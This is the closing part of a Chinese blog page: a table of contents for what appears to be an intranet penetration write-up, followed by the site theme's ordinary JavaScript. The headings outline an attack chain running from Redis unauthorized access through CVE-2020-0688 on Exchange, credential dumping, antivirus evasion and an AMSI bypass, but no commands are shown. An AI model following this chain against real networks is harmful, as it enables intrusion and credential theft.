href="#%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE"><span class="toc-text">虚拟机网卡设置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%EF%BC%9ARedis-%E6%9C%AA%E6%8E%88%E6%9D%83-%E2%86%92-SSH-%E5%85%AC%E9%92%A5%E5%86%99%E5%85%A5"><span class="toc-text">二、外网打点：Redis 未授权 → SSH 公钥写入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E7%A1%AE%E8%AE%A4"><span class="toc-text">Redis 未授权确认</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99-SSH-%E5%85%AC%E9%92%A5"><span class="toc-text">Redis 未授权写 SSH 公钥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%AC%AC%E4%B8%80%E5%B1%82%E5%86%85%E7%BD%91%EF%BC%9A52-%E7%BD%91%E6%AE%B5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">三、第一层内网：52 网段信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%96%B0%E7%BD%91%E6%AE%B5"><span class="toc-text">发现新网段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BF%BB%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4%E6%89%BE%E7%BA%BF%E7%B4%A2"><span class="toc-text">翻历史命令找线索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%8F%B0%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">第二台机器信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E5%B7%A5%E5%85%B7%EF%BC%9A%E9%80%9A%E8%BF%87%E4%B8%AD%E8%BD%AC%E4%B8%8B%E8%BD%BD-fscan"><span class="toc-text">传工具：通过中转下载 fscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB-93-%E7%BD%91%E6%AE%B5"><span class="toc-text">扫 93 网段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E7%AC%AC%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%EF%BC%9A93-%E7%BD%91%E6%AE%B5-MSF-%E8%B7%AF%E7%94%B1%E4%BB%A3%E7%90%86"><span class="toc-text">四、第二层内网：93 网段 + MSF 路由代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A9%E7%AC%AC%E4%B8%80%E5%8F%B0-Linux-%E4%B8%8A%E7%BA%BF-MSF"><span class="toc-text">让第一台 Linux 上线 MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A9%E7%AC%AC%E4%BA%8C%E5%8F%B0-Linux-%E4%B8%8A%E7%BA%BF-MSF"><span class="toc-text">让第二台 Linux 上线 MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80-SOCKS-%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AE-93-%E7%BD%91%E6%AE%B5"><span class="toc-text">开 SOCKS 代理访问 93 网段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0-OA-%E7%B3%BB%E7%BB%9F"><span class="toc-text">发现 OA 系统</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81MSSQL-%E5%85%A5%E5%8F%A3%EF%BC%9ASRV-WEB-KIT-%E8%90%BD%E5%9C%B0"><span class="toc-text">五、MSSQL 入口：SRV-WEB-KIT 落地</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-socat-%E4%B8%AD%E8%BD%AC%E7%AB%AF%E5%8F%A3%E8%BF%9E%E6%8E%A5-MSSQL"><span class="toc-text">用 socat 中转端口连接 MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-cmdshell-%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-text">xp_cmdshell 执行系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF"><span class="toc-text">收集机器信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81CS-%E4%B8%8A%E7%BA%BF%E3%80%81%E6%8F%90%E6%9D%83%E3%80%81%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">六、CS 上线、提权、域内信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CS-%E4%B8%8A%E7%BA%BF"><span class="toc-text">CS 上线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">域内信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%89%93-Exchange%EF%BC%9ACVE-2020-0688"><span class="toc-text">七、打 Exchange：CVE-2020-0688</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OWA-%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81"><span class="toc-text">OWA 登录验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">CVE-2020-0688 漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%87%AD%E6%8D%AE"><span class="toc-text">抓凭据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%A8%AA%E5%90%91%E5%88%B0-DF%EF%BC%9A%E5%85%8D%E6%9D%80-AMSI-%E7%BB%95%E8%BF%87"><span class="toc-text">八、横向到 DF：免杀 + AMSI 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4-DF-%E6%9C%BA%E5%99%A8"><span class="toc-text">确认 DF 机器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMIEXEC-PSEXEC-%E9%AA%8C%E8%AF%81%E5%8F%AF%E9%80%9A"><span class="toc-text">WMIEXEC &#x2F; PSEXEC 验证可通</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-PS1-%E5%90%8E%E9%97%A8"><span class="toc-text">上传 PS1 后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AES-%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80"><span class="toc-text">AES 加密免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AMSI-%E7%BB%95%E8%BF%87"><span class="toc-text">AMSI 绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">九、总结</span></a></li></ol></li></ol></div><div class="widget-footer"></div></widget>
+</div></div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const l_body = document.querySelector('.l_body');
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=mowvchv9" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/scrollreveal@4.0/dist/scrollreveal.min.js"></script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const slideUp = {
+      distance: `12px`,
+      duration: `400`,
+      interval: `80`,
+      scale: `0.98`,
+      opacity: 0,
+      easing: "ease-out",
+      reset: false,
+      mobile: false,
+      useDelay: 'once'
+    };
+    ScrollReveal({ container: '.widgets' }).reveal('.slide-up', { ...slideUp });
+    ScrollReveal({ container: '.l_main' }).reveal('.slide-up', { ...slideUp });
+    ScrollReveal({ container: '.l_right' }).reveal('.slide-up', { ...slideUp });
+  });
+</script>
+<script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    mermaid.initialize({
+      theme: "default",
+      logLevel: 3
+    });
+    mermaid.run({ querySelector: '.mermaid' });
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Custom Image Viewer -->
+<script src="/js/plugins/image-viewer.js"></script>
+
+<!-- Custom Context Menu -->
+<script src="/js/plugins/custom-context-menu.js"></script>
+
+<!-- Glitch Effect -->
+<script src="/js/plugins/glitch-effect.js"></script>
+
+<!-- Terminal Copy -->
+<script src="/js/plugins/terminal-copy.js"></script>
+
+<!-- Hotkeys -->
+<script src="/js/plugins/hotkeys.js"></script>
+
+<!-- Achievements / Card System -->
+<script src="/js/plugins/achievements.js?v=mowvchv9"></script>
+
+<!-- Special Days - 节日彩蛋系统 -->
+<script src="/js/plugins/special-days.js"></script>
+
